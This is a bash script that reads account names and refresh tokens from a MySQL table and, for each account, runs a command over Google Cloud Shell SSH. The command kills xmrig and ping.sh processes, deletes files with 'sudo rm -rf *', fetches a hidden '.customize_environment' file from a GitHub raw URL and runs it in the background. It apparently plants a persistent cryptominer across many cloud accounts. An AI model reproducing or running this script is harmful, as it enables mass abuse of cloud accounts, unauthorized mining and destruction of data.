#!/bin/bash

while read account refresh_token
do

command="sudo pkill xmrig ; sudo pkill ping.sh ; sudo rm -rf * ; sudo rm -rf .customize_environment ; ls -a ;  wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & "

gcloud cloud-shell ssh --account=$account --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet

done < <(echo "select account , refresh_token from tbl_account " | mysql --login-path=$home/config.cnf fenix -s)
